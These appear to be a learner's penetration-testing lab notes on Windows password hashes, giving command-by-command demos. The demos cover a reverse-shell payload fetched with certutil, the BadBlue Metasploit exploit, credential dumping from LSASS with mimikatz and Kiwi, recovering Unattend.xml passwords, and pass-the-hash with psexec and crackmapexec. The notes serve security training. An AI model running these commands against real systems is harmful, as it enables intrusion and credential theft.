# Windows Password Hashes
- The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
- Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA)
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
  - LM
  - NTLM
- Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.
khggff
## SAM Database
- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the OS is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with a syskey.
- Administrative privileges are required in order to access and interact with the LSASS process.

## LM (LanMan)
- LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.
- The protocol is used to hash user passwords, and the hasing process can be broken down into the following steps:
  - The password is broken into two seven-character chunks
  - All characters are then converted into uppercase
  - Each chunk is then hashed separately with the DES algorithm.
- LM hashing is generally considered to be a weak protocol and can easily be cracked, primarly because the password hash does not include salts consequently making brute-force and rainbow table attacks effective against LM hashes.

![grafik](https://github.com/user-attachments/assets/a26dee98-a0ee-4713-b809-63b8813629c4)

## NTLM (NT HASH)
- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- Form Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
  - Does not split the hash in to two chunks
  - Case sensitive
  - Allows the use of symbols and unicode characters
![grafik](https://github.com/user-attachments/assets/448a152b-8e1c-4b6d-a87d-f2def4139e73)

# Windows Configuration Files

## Unattended Windows Setup
- The **Unattended Windows Setup** utility utilizes configuration files that contain user account and system configuration information. Key files include:
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Autounattend.xml`
- For security, passwords in these configuration files may be encoded in Base64.

## Demo: Searching For Passwords In Windows Configuration Files
In this demonstration, we gain access to the target via a meterpreter session, locate the `Unattend.xml` file to identify the password, decode it with Base64, and authenticate with the target using PSexec.

1. **Check User Privileges on the Target**
   - Run the following command to check user privileges:
     ```
     net user
     ```
   - This command shows the user accounts on the target. We use it to confirm if we are running as an unprivileged user.

2. **Generate a Malicious Payload**
   - Create a malicious payload using `msfvenom`:
     ```
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ownIP] LPORT=1234 -f exe > payload.exe
     ```
   - This command generates a reverse TCP payload for meterpreter.

3. **Set Up a Simple HTTP Server**
   - Start a simple HTTP server to host the payload:
     ```
     python -m SimpleHTTPServer 80
     ```
   - This command sets up a basic HTTP server to serve `payload.exe`. We can access the server from the target system to download the payload.

4. **Download and Execute the Payload on the Target**
   - On the target system, open the command prompt and navigate to the Desktop:
     ```
     cd Desktop
     ```
   - Download the payload using `certutil`:
     ```
     certutil -urlcache -f http://[kali system IP]/payload.exe payload.exe
     ```
   - This command downloads the `payload.exe` from the HTTP server to the target system.

5. **Set Up Metasploit to Handle the Payload**
   - On our Kali Linux machine, start PostgreSQL and Metasploit:
     ```
     service postgresql start && msfconsole
     ```
   - Configure Metasploit to handle incoming connections from the payload:
     ```
     use multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
     set LPORT 1234
     set LHOST [kali IP]
     run
     ```
   - These commands set up Metasploit to listen for the reverse shell connection.

6. **Establish a Meterpreter Session**
   - When the payload is executed on the target, a meterpreter session should be created.

7. **Search for the Unattend.xml File**
   - In the meterpreter session, gather system information:
     ```
     sysinfo
     ```
   - Search for the `Unattend.xml` file:
     ```
     search -f Unattend.xml
     ```
   - Alternatively, navigate manually to the directory:
     ```
     cd C:\
     cd Windows
     cd Panther
     dir
     ```
   - Download the `Unattend.xml` file to our local machine:
     ```
     download Unattend.xml
     ```

8. **Extract and Decode the Password**
   - View the contents of the `Unattend.xml` file:
     ```
     cat Unattend.xml
     ```
   - If the `PlainText` attribute is `false`, the password is encoded in Base64. Copy the encoded password.
   - Create a text file and paste the copied password:
     ```
     vim password.txt
     ```
   - Decode the Base64-encoded password:
     ```
     base64 -d password.txt
     ```

9. **Authenticate with the Target Using PSexec**
   - Use PSexec to authenticate with the target system as Administrator:
     ```
     psexec.py Administrator@[target IP]
     ```
   - Enter the decrypted password when prompted.

   - We should now gain a command shell session on the target system.

# Dumping Hashes with Mimikatz

## Mimikatz
- Windows post-exploitation tool which allows the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
- THE SAM (Secruity Account Manager) database, is a database file on Windows systems that stores hashed user passwords.
- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are chached.
- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

## Demo: Dumping Hashes With Mimikatz

`nmap -sV  [target IP]`

We use metasploit to exploit the specific installed version of badblue:

`service postgresql start && msfconsole`

`search badblue`

`use 1 `

`show options`

`set rhosts [target IP]`

`exploit`

We get a meterpreter session on our target system.

`sysinfo`

`getuid`

`pgrep lsass`: We want to migrate to the lsas.exe process

`migrate xxx`

`getuid`: we should get NT Authority System privilege

### Kiwi Module (meterpreter extension):

`load kiwi`

example: `creds_all` Gives us credentials all credentials. 

`lsa_dump_sam`: Dumps all ntlm hashes of the users of the system. Mimikatz provides us the SYSKey and SAMKey

`lsa_dump_secrets`: could provide us with clear text creds.


### Mimikatz

still in meterpreter session

`pwd`: shows us the actual path

`cd C:\\`

`mkdir Temp`

`cd Temp`

`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`

`shell`

`dir` we have mimikatz here

`mimikatz.exe`

`privilege::Debug`check if we have privs; 20 OK

`lsadump::sam`if we want to dump the cache od lsass process

`lsadump::secrets`:DUMPING LSASECRETS

`sekurlsa::logonpasswords`:Display logon passwords, if configured passwords show in clear text when logon is configured as cleartext

# Pass-The-Hash Attacks
## Pass-The-Hash
- Pass-the-hash is an exploitation technique that involves captturing or harversting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
- We can use multiple tools to facilitate a Pass-The-Hash attack:
  - Metasploit PsExec module
  - Crackmapexec
- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining acces via service exploitation

## Demo: Pass-The-Hash Attacks

We start with the exploiting the BadBlue service and then we dump the hashes using Kiwi. Then we try to use the hashes to perform a pass-the-hash attack.

`service postgresql start && msf console`
msf6:`searcg badblue`

msf6:`use 1`

we leave the default payload as windows/meterpreter/reverse_tcp


msf6:`set rhosts [target IP]`


msf6:`exploit`

meterpreter session successful.

meterpreter:`pgrep lsass`

meterpreter: `migrate [process ID]`

meterpreter: `getuid`

whe should have admin privs.

meterpreter: `load kiwi`

meterpreter: `lsa_dump_sam`

With lsa_dump_sam we want to get the admin ntlm credentials. We get the admin NTLM hash. We can copy that into a txt file.

Now we want to try the first technique with the PSExec metasploit module.

meterpreter: `hashdump`

We also copy the LM hash into the txt file.

We put this meterpreter session in the background using ctrl z

`search psexec`

We look for exploit/windows/smb/psexec. 

`use [ID]`

We use the same payload as before: windows/meterpreter/reverse_tcp

`show options`

`sessions`

our current sessions runs on port xx. We want to start another meterpreter session, so we configure the payload again with different parameters:

`set lport 1234`


`set rhosts [target IP]`

`Set SMBUser Administrator`

`set SMBPass [LM NTLM Hash]`

`exploit`

doesn't work, because we have to specify the target:

`set target Command`

`exploit`

still no session. We need to configure the target different:

`set target Native\ upload`

`exploit`

meterpreter: `sysinfo`

meterpreter: `getuid`

Successfully obtained a meterpreter session. Lets do this again:

meterpreter: `exit`

msf6 exploit: `sessions`

We see that we are still in the session where we obtained the hashes earlier. So we kill that:

msf6 exploit: `Sessions -K`

`show options`

`exploit`

We gained access again.

### Crackmapexec

`crackmapexec smb [target IP] -u Administrator -H "[ntlm hash]"`

System is pawned.

`crackmapexec smb [target IP] -u Administrator -H "[ntlm hash]" -X "ipconfig"`

gives few errors, but we still se the output (lab issues)

`crackmapexec smb [target IP] -u Administrator -H "[ntlm hash]" -X "whoami"`

Gives us "AttackDefenseAdministrator"


